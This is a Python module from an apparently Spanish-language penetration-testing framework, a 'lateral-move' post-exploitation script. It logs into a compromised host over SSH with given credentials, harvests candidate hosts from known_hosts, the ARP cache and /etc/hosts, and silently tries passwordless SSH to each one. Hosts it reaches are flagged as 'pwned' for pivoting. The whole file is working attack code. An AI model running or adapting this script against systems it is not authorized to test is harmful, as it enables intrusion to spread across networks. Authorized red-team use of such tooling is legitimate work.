# scripts/ssh/post/lateral_move.py
import paramiko
from scripts.base import BaseScript
from core.output import print_result, print_table, console
from core import session_db

class Script(BaseScript):
    name        = "lateral-move"
    protocol    = "ssh"
    category    = "post"
    description = "Detecta hosts SSH accesibles desde el objetivo usando claves locales (pivoting)."

    EXAMPLES = [
        {"flag": "-u / -p", "desc": "Credenciales para entrar al sistema comprometido",
         "good": "ssh --script=lateral-move -t 10.10.10.5 -u root -p Pass123!",
         "bad":  "ssh --script=lateral-move -t 10.10.10.5 (sin credenciales)"},
    ]

    def run(self, **kwargs):
        port    = int(kwargs.get("port") or 22)
        timeout = int(kwargs.get("timeout") or self.target.timeout or 5)
        ip      = self.target.ip

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=self.creds.user,
                           password=self.creds.password or "",
                           timeout=timeout, allow_agent=False, look_for_keys=False)
        except Exception as e:
            print_result("SSH", ip, "fail", f"no se pudo autenticar: {e}")
            return None

        print_result("SSH", ip, "info", "lateral-move: analizando known_hosts y ARP...")

        _, stdout, _ = client.exec_command(
            "cat ~/.ssh/known_hosts /etc/ssh/ssh_known_hosts 2>/dev/null | "
            "awk '{print $1}' | cut -d, -f1 | grep -v '|' | sort -u"
        )
        known_hosts = [h.strip() for h in stdout.read().decode().splitlines() if h.strip()]

        _, stdout, _ = client.exec_command(
            "arp -n 2>/dev/null | awk 'NR>1 {print $1}' | sort -u"
        )
        arp_hosts = [h.strip() for h in stdout.read().decode().splitlines() if h.strip()]

        _, stdout, _ = client.exec_command(
            "grep -v '^#\\|^$\\|localhost\\|127\\.' /etc/hosts | awk '{print $1}' | sort -u"
        )
        etc_hosts = [h.strip() for h in stdout.read().decode().splitlines() if h.strip()]

        all_hosts = list(set(known_hosts + arp_hosts + etc_hosts))
        print_result("SSH", ip, "info",
                     f"lateral-move: {len(all_hosts)} host(s) candidatos")

        reachable = []
        for host in all_hosts[:20]:
            _, stdout, _ = client.exec_command(
                f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 "
                f"-o BatchMode=yes -o PasswordAuthentication=no "
                f"{host} 'echo lobera_ok' 2>&1",
                timeout=8
            )
            if "lobera_ok" in stdout.read().decode():
                print_result("SSH", ip, "pwned",
                             f"MOVIMIENTO LATERAL: {host} accesible sin contraseña")
                session_db.save_finding(ip, "SSH", "lateral_move_target", host)
                reachable.append(host)

        client.close()

        if reachable:
            print_table(f"Hosts accesibles via SSH desde {ip}",
                        ["Host"], [(h,) for h in reachable])
        else:
            print_result("SSH", ip, "info",
                         "No se encontraron hosts accesibles sin contraseña")

        return reachable
